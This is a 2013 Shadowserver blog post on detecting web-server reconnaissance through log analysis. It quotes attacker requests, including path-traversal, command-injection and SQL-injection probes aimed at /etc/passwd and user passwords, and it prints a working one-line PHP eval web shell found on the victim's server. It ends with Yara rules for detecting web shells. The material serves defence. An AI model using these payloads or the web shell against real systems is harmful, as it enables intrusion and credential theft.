# Breaking the Kill Chain with Log Analysis

- **Source :** ShadowServer
- **URL :** https://www.shadowserver.org/news/breaking-the-kill-chain-with-log-analysis/
- **Date :** 2013-05-06

---

# Breaking the Kill Chain with Log Analysis

May 6, 2013

_By Ned Moran and Steven Adair_

At Shadowserver we have observed cyber threat actors use [strategic web compromise](/news/cyber-espionage-strategic-web-compromises-trusted-websites-serving-dangerous-results/) as an avenue to infect high-value victims. In this context, we define a strategically important website as one that attracts specific audiences – audiences that a threat actor is interested in targeting.

There are a number of ways that a threat actor can gain administrative access to a strategically important website. One obvious avenue of access is via spear phishing. A threat actor could send well-crafted emails with malicious links or attachments to targets in an organization. Once the threat actor has gained a foothold within the targeted organization they could move laterally until they gain access to the victim organization’s web servers.

Another more direct route, one that we will discuss in more detail here, is via web vulnerability scanning.

Shadowserver recently aided a victim organization that maintained a website that drew an audience of policymakers, academics, and members of industry. The victim organization had been compromised and their website was altered by an APT threat actor so that it redirected visitors to another malicious website serving an exploit. We conducted a detailed analysis of the victim’s weblogs and found evidence of multiple attempts to gain access to the organization’s web server through brute force scanning by more than one threat actors. While it is unclear if these scanning operations were related to the later website compromise, we believe that consistent review of the web logs would have alerted the victim to potential threats prior to the alteration of their website.

Each of the actors began their scanning operation by traversing links off the homepage of the targeted organization’s website and by requesting common directory and file paths. The following log excerpt shows the GET request where the threat actor discovered an open log directory on the target organizations website:

"GET /logs/ HTTP/1.1" 200

The actors then downloaded all the available web access logs. These access logs provided the adversary with a map to the target’s website as well as a detailed profile of the website’s visitors. Open log directories present a clear threat as they provide an adversary with an easy way to conduct reconnaissance for future attacks. We recommend against providing open access to web logs.

We then observed the threat actors search for admin consoles on the targets website:

"GET /web-console/ HTTP/1.1" 404  
"GET /phpmyadmin/main.php HTTP/1.1″ 404  
“GET /mysql/main.php HTTP/1.1″ 404  
“GET /db/main.php HTTP/1.1" 404  
"GET /dbadmin/main.php HTTP/1.1" 404  
"GET /memberlist HTTP/1.1" 404

We also saw the actors conduct reconnaissance for sensitive information:

"GET /private.key HTTP/1.1" 404  
"GET /database.inc HTTP/1.1" 404  
"GET /webstats.html HTTP/1.1" 404  
"GET /schema.sql HTTP/1.1" 404  
"GET /customers.xls HTTP/1.1" 404  
"GET /images/passwords.mdb HTTP/1.1" 404

Data gathered from the above reconnaissance could have been used as intelligence in support of the attack to gain access to the targets website, or the data could be used to support future attacks against the target organization and its partners or customers.

The actors then continues to probe for a variety of web vulnerabilities:

"GET /%0d%0a%20SomeCustomInjectedHeader%3ainjected_by_wvs HTTP/1.1" 404  
"GET /Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAucG5n HTTP/1.1" 404  
"GET /../..//../..//../..//../..//../..//etc/passwd%00 HTTP/1.1" 404 "GET /%26cat%20%2fetc%2fpasswd HTTP/1.1" 404  
"GET /New%20folder%20(2) HTTP/1.1" 404  
"GET /response.write(9674459*9948960) HTTP/1.1" 404  
"GET /index.php?cat=-1%20union%20select%200,concat(user_login,char(32),user_pass),0,0,0%20from%20an_users HTTP/1.1" 404

Finally, we observed evidence of the actors scanning for web shells on the target website:

"GET /r57shell.php HTTP/1.1" 404  
"GET /shell.php HTTP/1.1" 404  
"GET /dra.php HTTP/1.1" 404  
"GET /lol.php HTTP/1.1" 404  
"GET /php-backdoor.php HTTP/1.1" 404  
"GET /aspxspy.aspx HTTP/1.1" 404  
"GET /images/c99.php HTTP/1.1" 404

While the GET requests we observed returned a 404 ‘File Not Found’ error code, had one of the requests returned a 200 it is likely the actors would have proceeded to exploit the existing web shell as a means to access the targets web server. This example demonstrates that targeted threat actors could easily leverage the work done by more conventional cyber criminals to gain access to strategically important websites.

In total, we observed 3 different scanning operations from 4 different source ips. The first scanning operation occurred in August of 2012 and the most recent occurred in February 2013. The longest scanning operation occurred over a 20 hour window and the shortest was completed in 1 hour. On average these scans generated approximately 8000 requests for resources from the target website. Further, each of these scanning operations generated an unusually high number of 404 “File Not Found” error codes.

Further analysis revealed that the victim web server actually had three different PHP-based webshell backdoors on it. Two of the webshells were on the server at the time of the aforementioned scanning and were actually stumbled upon by the attackers (unbeknownst to them). These two webshells were simple one-liners that take data sent via POST and passed through a variable named ‘cmd’. The source of these webshells appeared as follows:

<?php @eval($_POST['cmd']);?>

The simple one-line file is dangerous, as it will process any commands sent to the ‘cmd’ variable. It essentially provides the attacker with remote access to the system with the privileges of the user context that the webserver is running under. This simple one-liner is often found as a standalone file or can be inserted into an existing legitimate file to make it harder to find. The attackers in this case timestamped the files so that they appeared to be the same age as other files in the directory. This technique is often used to evade detection by the human eye when looking through directories for new or recently modified files.

To combat this threat we recommend that organizations conduct regular and thorough log analysis in an effort to detect anomalous activity. Analysts should examine logs for:

  * An unusual number of requests from a single or small group of ip addresses across a narrow window of time
  * An unusual number of 404s generated by a single or small group of ip addresses across a narrow window of time
  * Any requests for known web shells such as c99.php
  * Any suspicious request that appears to exploit vulnerabilities such as SQLi or XSS
  * POST requests to files that you don’t recognize or do not typically accept POST data
  * Files being accessed with what appear to be commands issued to them via URI parameters (GET being used vs POST)



Defenders should take careful note of ip addresses that generate requests fitting the above profile and adjust their defensive perimeter accordingly.

As discussed in the paper “[Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains](http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf)”, the first stage of a targeted attack is reconnaissance. The authors, Hutchins, Cloppert, and Amin write that reconnaissance is the “research, identification and selection of targets, often represented as crawling Internet websites such as conference proceedings and mailing lists for email addresses, social relationships, or information on specific technologies.”

The detailed log analysis suggested above will help organizations uncover this reconnaissance activity and may well provide a leading indicator of targeted threat activity. As we expect targeted attackers to continue the use of strategic web compromise as a method of attack we believe log analysis to be a vitally important component of computer network defense.

We also recommend that organization employ a tool like Yara to scan the files on their web servers. Yara will enable defenders to identify and classify any malicious web shells found on their web server. The signatures below were generously donated by friend of Shadowserver Phil Burdette and will detect simple variations of the ever-common c99 web shell.

rule C99madShell  
{  
meta:  
date = "2013-05-06"  
reference md5 = "d8f9fbbc7a0bc702c15a5318cc618b99"  
url_ref = "http://www.derekfountain.org/security_c99madshell.php"  
strings:  
$a = "find all suid files"  
$b = "find suid files in current dir"  
$c = "find all sgid files"  
$d = "find sgid files in current dir"  
$e = "find config.inc.php files"  
$f = "find config* files"  
$g = "find config* files in current dir"  
$h = "find all writable folders and files"  
$i = "find all writable folders and files in current dir"  
$j = "find all service.pwd files"  
$k = "find service.pwd files in current dir"  
$l = "find all .htpasswd files"  
$m = "find .htpasswd files in current dir"  
$n = "find all .bash_history files"  
$o = "find .bash_history files in current dir"  
$p = "find all .fetchmailrc files"  
$q = "find .fetchmailrc files in current dir"  
$r = "list file attributes on a Linux second extended file system"  
$s = "show opened ports"  
condition:  
all of them  
}

rule C99madShell_encoded  
{  
meta:  
date = "2013-05-06"  
url_ref = "http://www.derekfountain.org/security_c99madshell.php"  
strings:  
$a = "eval(gzinflate(base64_decode('HJ3HkqNQEkU"  
condition:  
$a  
}

rule suspect_eval  
{  
meta:  
date = "2013-05-06″  
url_ref ="https://www.shadowserver.org/news/breaking-the-kill-chain-with-log-analysis/"  
strings:  
$a = "eval($_POST["  
$b = "eval($_GET["  
condition:  
1of them  
}

It is important to note that the above signatures will only detect basic variations of a common web shell. A threat actor may use any number of different less available web shells. As such, defenders should conduct additional research and compile a robust list of signatures designed to identify and classify web shells. Additionally, it’s possible you have legitimate files where one of the above may fire, in particular the suspect_eval signature. You know your environment best and should determine if these are legitimate concerns or false positives.

Good luck and happy hunting!

  * [Threat Intelligence](/topics/threat-intelligence/)



[« Back to News & Insights](/news-insights/)

### Recent Articles

  * #### [Shadowserver 2025: Highlights of the Year in Review](/news/shadowserver-2025-highlights-of-the-year-in-review/)

September 7, 2026

A review of Shadowserver’s 21st year as the world’s largest provider of free, timely, actionable, daily cyber threat… [Read more »](/news/shadowserver-2025-highlights-of-the-year-in-review/)

  * #### [Shadowserver Critical Community Infrastructure Cyber Resilience Project](/news/shadowserver-critical-community-infrastructure-cyber-resilience-project/)

August 5, 2026

The Shadowserver Critical Community Infrastructure (CCI) Project is designed to improve the cybersecurity posture of essential… [Read more »](/news/shadowserver-critical-community-infrastructure-cyber-resilience-project/)

  * #### [StealC Historical Bot Infection Special Report](/news/stealc-historical-bot-infection-special-report/)

June 25, 2026

On Wednesday 24th June 2026, international law enforcement partners announced additional successful cyber crime disruption… [Read more »](/news/stealc-historical-bot-infection-special-report/)

  * #### [SocGholish Compromised WordPress Sites Special Report](/news/socgholish-compromised-wordpress-sites-special-report/)

June 18, 2026

On Thursday 18th June 2026, international law enforcement partners announced another successful cyber crime disruption action as… [Read more »](/news/socgholish-compromised-wordpress-sites-special-report/)